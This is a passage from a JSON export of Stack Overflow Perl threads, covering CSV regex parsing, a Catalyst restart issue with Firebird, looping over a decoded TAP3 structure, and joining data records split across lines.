\\n\";\n        foreach (sort keys %hash) {\n                print $_, \"\\n\";\n        }\n}\n\n__DATA__\n\"@timestamp\",url,ts,macin,caid\n\"Nov 22, 2019 @ 17:19:07.571\",\"http://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4432595.ts/9836847.3018322401\",1574443147021,40EVFVRFB,9836847\n\"Nov 22, 2019 @ 17:18:59.264\",\"http://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4431573.ts/0292929.5002731501\",1574443138223,BVFEFZZ9C4,0292929\n</code></pre>\n\n<p><strong>Here the output:</strong></p>\n\n<pre><code>here the regex values:\nhttp://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4432595.ts/|9836847|.3018322401\"|,|1574443147021|,|40EVFVRFB,9836847\nhttp://pdzr.rt.pl:8889/qsdf/ZDF/vsLop/DIZJ4431573.ts/|0292929|.5002731501\"|,|1574443138223|,|BVFEFZZ9C4,0292929\n\nhere the hash values:\n20191122181858|0292929|BVFEFZZ9C4|DIZJ4431573.ts|http://pdzr.rt.pl:8889\n20191122181907|9836847|40EVFVRFB|DIZJ4432595.ts|http://pdzr.rt.pl:8889\n</code></pre>\n"}, {"tags": ["perl", "firebird", "catalyst"], "owner": {"reputation": 319, "user_id": 1112968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f57fe2cca501816c92d2591c4f14b87f?s=128&d=identicon&r=PG", "display_name": "Lex", "link": "https://stackoverflow.com/users/1112968/lex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 28, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1574694525, "creation_date": 1574694390, "last_edit_date": 1574694525, "question_id": 59034742, "link": "https://stackoverflow.com/questions/59034742/what-factors-do-influence-the-catalyst-app-restart-mechanism-firebird-connecti", "title": "What factors do influence the Catalyst app restart mechanism? (Firebird connection)", "body": "<p>I have a problem like in <a href=\"https://stackoverflow.com/questions/7077483/what-factors-do-influence-the-catalyst-app-restart-mechanism\">this question</a></p>\n\n<blockquote>\n  <p>I have a Perl Catalyst application which is launched normally using\n  the -r parameter. I have noticed 2 types of behaviour:</p>\n  \n  <p>1) the application restarts normally on every \"dummy change\" of the\n  code (by \"dummy change\" I mean adding a space or deleting one, smth\n  like this)</p>\n  \n  <p>2) the application doesn't restart (the same \"dummy change\"), the\n  \"Attempting to restart the server\" text is displayed and the app\n  remains blocked in this state (I have to kill it manually)</p>\n  \n  <p>The behaviour depends on the actual code. It seems there is something\n  related to the code which influences which behaviour acts at one\n  moment. The behaviour is constant, i.e. the same code have one\n  constant behaviour of 2. The application itself seems to work fine,\n  without any errors or warnings.</p>\n  \n  <p>How could the code influence this behaviour? (I mean generally) What\n  factors are related to restart mechanism?</p>\n</blockquote>\n\n<p>But I don't have connection to OracleDB, I have connection to Firebird DB through DBD::Firebird.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1574694688, "post_id": 59034545, "comment_id": 104312726, "body": "There is no <code>break</code> statement in Perl. Also you are not showing us the full code, or you don&#39;t have <code>use strict</code> and <code>use warnings</code>. There might be other typos in your code. What is the output you are getting?"}, {"owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1574695266, "post_id": 59034545, "comment_id": 104313029, "body": "im keep getting errors, no i use strict and warnings dear"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574695764, "post_id": 59034545, "comment_id": 104313273, "body": "Can you please show the exact <code>Dumper</code> call you used?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574695807, "post_id": 59034545, "comment_id": 104313293, "body": "Re &quot;<i>There is no <code>break</code> statement in Perl.</i>&quot;, Well, there is, but it&#39;s invoked as <code>last</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1574695844, "post_id": 59034545, "comment_id": 104313310, "body": "<code>$count_1 = 1</code> is probably supposed to be <code>$count_1 == 1</code>, etc"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574695872, "post_id": 59034545, "comment_id": 104313327, "body": "Re &quot;<i>im keep getting errors</i>&quot;, What errors? Please add the error messages you get to your question."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1574696019, "post_id": 59034545, "comment_id": 104313420, "body": "No, the break statement (<code>last</code>) does not require <code>use feature &#39;switch&#39;</code> or <code>use v5.10</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1574696123, "post_id": 59034545, "comment_id": 104313472, "body": "@simbabque, noone&#39;s talking about that but you"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1574698065, "post_id": 59034545, "comment_id": 104314580, "body": "@simbabque, I know. But you incorrectly pointed out what was wrong. There&#39;s no need to find an alternative way of achieving what they are trying to do, they just need to use the right spelling."}, {"owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574708968, "post_id": 59034545, "comment_id": 104319961, "body": "@ikegami i have updated my question with full code can you take a look"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574711411, "post_id": 59034545, "comment_id": 104320990, "body": "??? I asked for the exact call to <code>Dumper</code>?"}, {"owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "edited": false, "score": 0, "creation_date": 1574712731, "post_id": 59034545, "comment_id": 104321475, "body": "sorry brother im still beginner i wish i understand what you want <code>$t = $struct-&gt;{&#39;transferBatch&#39;}-&gt;{&#39;networkInfo&#39;};</code> then <code>print Dumper \\$t;</code> , sorry i did understand well"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1574741950, "post_id": 59034545, "comment_id": 104329254, "body": "You need to tag someone (<code>@ikegami</code>) for them to get notified if it&#39;s not tehir post to which you are replying."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1574741985, "post_id": 59034545, "comment_id": 104329260, "body": "<code>print Dumper \\$t;</code> should have been <code>print Dumper $t</code>. That explains the extra `` in the output (which I removed)."}, {"owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1575030058, "post_id": 59034545, "comment_id": 104441239, "body": "@ikegami brother do you have any idea about this thread : <a href=\"https://stackoverflow.com/questions/59096959/decoding-list-of-file-on-conditions?noredirect=1#comment104431581_59096959\" title=\"decoding list of file on conditions\">stackoverflow.com/questions/59096959/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "is_accepted": true, "score": 2, "last_activity_date": 1574715755, "creation_date": 1574715755, "answer_id": 59040053, "question_id": 59034545, "link": "https://stackoverflow.com/questions/59034545/iterating-over-structure-with-perl/59040053#59040053", "title": "iterating over structure with perl", "body": "<p>I Don't know if there's another method for counter, but it Worked with me :</p>\n\n<pre><code>my $element;\n$counter_rec2 = 0;\n$counter_rec1 = 0;\n\nforeach $element ( @{$struct-&gt;{'transferBatch'}-&gt;{'networkInfo'}-&gt;{'recEntityInfo'} } ) {\n\n    if (defined $element-&gt;{recEntityType} &amp;&amp; $element-&gt;{recEntityType}==2 &amp;&amp; $counter_rec2 == 0 ) {\n        $recEntityCode2=$element-&gt;{recEntityCode};\n        $counter_rec2 = $counter_rec2 +1;\n        print \"recEntityCode: $recEntityCode2\\n\";\n    }\n\n    if (defined $element-&gt;{recEntityType} &amp;&amp; $element-&gt;{recEntityType}==1 &amp;&amp; $counter_rec1 == 0 ) {\n        $counter_rec1 = $counter_rec1 +1;\n        $recEntityCode1=$element-&gt;{recEntityCode};\n        print \"recEntityCode: $recEntityCode1\\n\";\n    }\n\n}\n\nprint \"this is value for 2 $recEntityCode2\\n\";\nprint \"this is value for 1 $recEntityCode1\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 460, "user_id": 1546132, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/293209332d895fb60448e72b44ad5810?s=128&d=identicon&r=PG", "display_name": "s0me0ne", "link": "https://stackoverflow.com/users/1546132/s0me0ne"}, "is_accepted": false, "score": 2, "last_activity_date": 1574726203, "creation_date": 1574726203, "answer_id": 59041811, "question_id": 59034545, "link": "https://stackoverflow.com/questions/59034545/iterating-over-structure-with-perl/59041811#59041811", "title": "iterating over structure with perl", "body": "<p>Well, there're many solutions depending on what you exactly have and what you exactly want (TIMTOWTDI, you know). Do you know an exact number of entity types? Are you sure there's at least one array element for each of those entities?</p>\n\n<p>The following code is rather dirty and proof-of-concept just to give you an idea, and it answers the literal question as it was asked (I assume your input hash is referenced as <code>$r</code>):</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>no strict;\nno warnings;\nuse List::Util qw(first);\n\nfor my $type (1, 2) {\n    ${qq|recEntityCode_$type|} = (first { $_-&gt;{recEntityType} == $type } $r-&gt;{recEntityInfo}-&gt;@*)-&gt;{recEntityCode};\n}\n\nprint $recEntityCode_1 . \"\\n\";\nprint $recEntityCode_2 . \"\\n\";\n</code></pre>\n\n<p>For sure, I wouldn't use it. Much better way is to create a hash to store your results and not to declare separate variables for each of them:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings;\nuse List::Util qw(first);\n\nmy %recEntityCodes;\n\nfor my $type (1, 2) {\n    $recEntityCodes{$type} = (first { $_-&gt;{recEntityType} == $type } $r-&gt;{recEntityInfo}-&gt;@*)-&gt;{recEntityCode};\n}\n\nprint $recEntityCodes{1} . \"\\n\";\nprint $recEntityCodes{2} . \"\\n\";\n</code></pre>\n\n<p>Easy to see it is not optimal either, as we're walking the array from the start for each type (again, just to demonstrate one of possible solutions).</p>\n\n<p>The simpliest solution I can invent out of my head is the following:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>\nuse strict;\nuse warnings;\n\nmy %recEntityCodes;\n\n$recEntityCodes{$_-&gt;{recEntityType}} //= $_-&gt;{recEntityCode} for $r-&gt;{recEntityInfo}-&gt;@*;\n\nprint $recEntityCodes{1} . \"\\n\";\nprint $recEntityCodes{2} . \"\\n\";\n</code></pre>\n\n<p>Here we walk an array just once, but, on the other hand, we always walk the whole array.</p>\n\n<p>Which one is the best is up to you. If you array is short enough you usually don't care and just take variant 3 as shortest code. If the array is large, either of variants 2 or 3 may be profitable depending on array properties. If the array is really huge, it worth optimizing further.</p>\n"}], "owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 119, "favorite_count": 0, "accepted_answer_id": 59040053, "answer_count": 2, "score": 0, "last_activity_date": 1574741992, "creation_date": 1574693756, "last_edit_date": 1574741992, "question_id": 59034545, "link": "https://stackoverflow.com/questions/59034545/iterating-over-structure-with-perl", "title": "iterating over structure with perl", "body": "<p>im still beginner with perl , here im trying to loop over <code>$struct-&gt;{'transferBatch'}-&gt;{'networkInfo'};</code> and its dump looks like :</p>\n\n<pre><code>$VAR1 = {\n            'utcTimeOffsetInfo' =&gt; [\n                                     {\n                                       'utcTimeOffset' =&gt; '+0100',\n                                       'utcTimeOffsetCode' =&gt; 0\n                                     }\n                                   ],\n            'recEntityInfo' =&gt; [\n                                 {\n                                   'recEntityId' =&gt; '87.238.128.37',\n                                   'recEntityType' =&gt; 2,\n                                   'recEntityCode' =&gt; 0\n                                 },\n                                 {\n                                   'recEntityCode' =&gt; 1,\n                                   'recEntityType' =&gt; 2,\n                                   'recEntityId' =&gt; '213.233.130.201'\n                                 },\n                                 {\n                                   'recEntityId' =&gt; '353876999524',\n                                   'recEntityCode' =&gt; 1,\n                                   'recEntityType' =&gt; 1\n                                 },\n                                 {\n                                   'recEntityCode' =&gt; 3,\n                                   'recEntityType' =&gt; 1,\n                                   'recEntityId' =&gt; '353876999523'\n                                 }\n                               ]\n          };\n</code></pre>\n\n<p>i just want to get the <code>recEntityCode</code> where <code>recEntityType = 2</code> and store it in veriable <code>$recEntityCode_2</code> and same thing for <code>recEntityType = 1</code> <code>$recEntityCode_1</code> , only one value for each on of them just first catch then break out the loop</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse warnings;\n\nuse TAP3::Tap3edit;\nuse Data::Dumper;\n\n\n\nprintDir(\".\");\nsub printDir{\nopendir(DIR, $_[0]);\nmy @files;\nmy @dirs;\n (@files) = readdir(DIR);\n foreach my $file (@files) {\n    if (-f $file and substr($file,0,2) eq \"CD\") {\n\n\n     my $tap3 = TAP3::Tap3edit-&gt;new;\n\n     my $tap_file = $file;\n$tap3-&gt;decode($tap_file)  or  die $tap3-&gt;error; \n\nmy $struct=$tap3-&gt;structure;\n\nmy $Tracker = $struct-&gt;{'transferBatch'};\nif (defined $Tracker){\n\n\n\nmy $rectag = $struct-&gt;{'transferBatch'}-&gt;{'networkInfo'}-&gt;{'recEntityInfo'};\n\n$count_1=0;\n$count_2=0\nforeach my $rectag1( @{$rectag} )\n{\n    if ($rectag1-&gt;{'recEntityType'} &amp;&amp; int($rectag1-&gt;{'recEntityType'}) == 2){\n      $var1_recEntityType = $rectag1-&gt;{'recEntityCode'}\n      $count_1 = $count_1 + 1;\n    }\n    if ($rectag1-&gt;{'recEntityType'} &amp;&amp; int($rectag1-&gt;{'recEntityType'}) == 1){\n      $var1_recEntityType = $rectag1-&gt;{'recEntityCode'}\n      $count_2 = $count_2 + 1;\n    }\n    if ($count_1 = 1 &amp;&amp; $count_2 = 1)\n    {\n    break;\n    }\n}\n\nprint $recEntityCode_2;\nprint$recEntityCode_1;\n$tap3-&gt;encode(\"$tap_file\")  or  die $tap3-&gt;error; \n\n}\n    }\n\n } \n\n closedir(DIR);\n}\n</code></pre>\n"}, {"tags": ["perl", "hash", "file-io"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574687629, "post_id": 59032468, "comment_id": 104308806, "body": "How do you know that the data on a line continues on the next line? For example, will there always be a continuation line if the number of fields on a line is less than 7?"}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574688036, "post_id": 59032468, "comment_id": 104309013, "body": "@H&#229;konH&#230;gland yes. For all the data there should be a 7 fields."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574688218, "post_id": 59032468, "comment_id": 104309112, "body": "Ok, also would it be possible to have more than one data line on a file line, e.g a line with 14 fields could define two data lines, or a line with 8 fields could define the 4 last items on one line and the 4 first on the next data line?"}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574689435, "post_id": 59032468, "comment_id": 104309808, "body": "@H&#229;konH&#230;gland No. At the maximum there should be only 7 fields in single data line."}], "answers": [{"comments": [{"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574692200, "post_id": 59033179, "comment_id": 104311377, "body": "I have updated the question (Input file in DATA handler). The format is slight different. And yes, there is maximum of 7 fields in each data line."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "reply_to_user": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574692708, "post_id": 59033179, "comment_id": 104311640, "body": "Now there is a colon in the first field: <code>Pr1:Date</code>. Is that a typo? It should be a semicolon, right?"}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574692816, "post_id": 59033179, "comment_id": 104311707, "body": "Its not typo. <code>Pr1:Date</code> or <code>Pr1:2019-11-21</code> is the actual data."}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "reply_to_user": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574692874, "post_id": 59033179, "comment_id": 104311731, "body": "Ok, then there is only 6 fields per line?"}, {"owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "edited": false, "score": 0, "creation_date": 1574692999, "post_id": 59033179, "comment_id": 104311809, "body": "Exactly. And that looks like <code>Pr1: Date;Time;Priority;Object;ID;OtherInfo</code>. There is a space between <code>Pr1:</code> and <code>Date</code>."}], "tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": false, "score": 1, "last_activity_date": 1574693727, "last_edit_date": 1574693727, "creation_date": 1574689254, "answer_id": 59033179, "question_id": 59032468, "link": "https://stackoverflow.com/questions/59032468/perl-data-in-new-line-cannot-be-extracted/59033179#59033179", "title": "Perl data in new line cannot be extracted", "body": "<p>Here is an example:</p>\n\n<pre><code>my %data_hash;\nmy $data = do { local $/; &lt;DATA&gt; };\nwhile ($data =~ /\n                (\\S+):\\s([0-9]{4}-[0-9]{2}-[0-9]{2});\n                ([0-9]{2}:[0-9]{2}:[0-9]{2});\n                ([^;]+);\n                ([^;]+);\n                ([^;]+);\n                ([^;\\n]+) /gx){\n    my ($primary,$date,$time,$priority,$obj,$id,$text) \n      =  map { s/^\\s+|\\s+$//gr } @{^CAPTURE};\n    $data_hash{$primary}{$id}{'DateTime'}   = $date.\" \".$time;\n    $data_hash{$primary}{$id}{'priority'}   = $priority;\n    $data_hash{$primary}{$id}{'obj'}        = $obj;\n    $data_hash{$primary}{$id}{'text'}       = $text;        \n}\n</code></pre>\n\n<p><strong>Output</strong>:</p>\n\n<pre><code>$VAR1 = {\n      'Pr1' =&gt; {\n                 '1' =&gt; {\n                          'DateTime' =&gt; '2019-11-21 15:30:54',\n                          'text' =&gt; 'No Info Provided',\n                          'obj' =&gt; 'Obj1',\n                          'priority' =&gt; 'Low'\n                        }\n               },\n      'Pr2' =&gt; {\n                 '5' =&gt; {\n                          'DateTime' =&gt; '2019-11-20 11:01:01',\n                          'obj' =&gt; 'Obj3 is example obj',\n                          'text' =&gt; 'No Info Provided',\n                          'priority' =&gt; 'Low'\n                        },\n                 '4' =&gt; {\n                          'obj' =&gt; 'Obj9',\n                          'text' =&gt; 'Line Missing',\n                          'DateTime' =&gt; '2019-11-20 05:10:10',\n                          'priority' =&gt; 'High'\n                        },\n                 '2' =&gt; {\n                          'priority' =&gt; 'High',\n                          'obj' =&gt; 'Obj2',\n                          'text' =&gt; 'Line Missing',\n                          'DateTime' =&gt; '2019-11-22 10:30:00'\n                        }\n               }\n    };\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 3051, "user_id": 6237339, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8e4c4dd2523d09028942a397df378237?s=128&d=identicon&r=PG&f=1", "display_name": "Skeeve", "link": "https://stackoverflow.com/users/6237339/skeeve"}, "is_accepted": false, "score": 0, "last_activity_date": 1574691861, "creation_date": 1574691861, "answer_id": 59033987, "question_id": 59032468, "link": "https://stackoverflow.com/questions/59032468/perl-data-in-new-line-cannot-be-extracted/59033987#59033987", "title": "Perl data in new line cannot be extracted", "body": "<p>You could simply read and append lines until you have seven \";\"</p>\n\n<pre><code>my $data_line= '';\nforeach my $line ( @data ){\n    chomp $line;\n    $data_line.= $line;\n    my ($primary,$date,$time,$priority,$obj,$id,$text) = split(\";\", $data_line);\n    next unless defined $text;\n    # your stuff here\n    $data_line= '';\n}\n</code></pre>\n"}], "owner": {"reputation": 2402, "user_id": 6124824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc81b6fda21a94d3f337e2e28463295e?s=128&d=identicon&r=PG", "display_name": "vkk05", "link": "https://stackoverflow.com/users/6124824/vkk05"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1574693727, "creation_date": 1574686890, "last_edit_date": 1574693116, "question_id": 59032468, "link": "https://stackoverflow.com/questions/59032468/perl-data-in-new-line-cannot-be-extracted", "title": "Perl data in new line cannot be extracted", "body": "<p>I have a large set of data which is coming from executing some commands and I am extracting some part from those data which are needed for my further processing. As of now I am storing this in a hash <code>%data_hash</code>.</p>\n\n<p>Here is my script:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy %data_hash;\nmy @data = &lt;DATA&gt; ;\n\nforeach my $data_line ( @data ){\n    chomp $data_line;\n    if( $data_line =~ m/[0-9]{4}-[0-9]{2}-[0-9]{2}\\;[0-9]{2}:[0-9]{2}:[0-9]{2}/){\n        my ($primary,$date,$time,$priority,$obj,$id,$text) = split(\";\", $data_line);\n\n        $data_hash{$primary}{$id}{'DateTime'}   = $date.\" \".$time;\n        $data_hash{$primary}{$id}{'priority'}   = $priority;\n        $data_hash{$primary}{$id}{'obj'}        = $obj;\n        $data_hash{$primary}{$id}{'text'}       = $text;\n    }\n}\n\nprint Dumper(\\%data_hash);\n\n__DATA__\n.......\n.......\nPr1: Date;Time;Priority;Object;ID;OtherInfo\nPr1: 2019-11-21;15:30:54;Low;Obj1;1;No Info Provided\n.......\n.......\nPr2: Date;Time;Priority;Object;ID;OtherInfo\nPr2: 2019-11-22;10:30:00;High;Obj2;2;Line Missing\nPr2: 2019-11-20;11:01:01;Low;Obj3 is example obj;\n 5;No Info Provided\nPr2: 2019-11-20;05:10:10;High;Obj9;4;Line Missing\n.......\n.......\n</code></pre>\n\n<p>and the resulting <code>hash</code> for the above input file is:</p>\n\n<pre><code>$VAR1 = {\n          'Pr1' =&gt; {\n                    '1' =&gt; {\n                             'priority' =&gt; 'Low',\n                             'text' =&gt; 'No Info Provided',\n                             'obj' =&gt; 'Obj1',\n                             'DateTime' =&gt; '2019-11-21 15:30:54'\n                           }\n                  },\n          'Pr2' 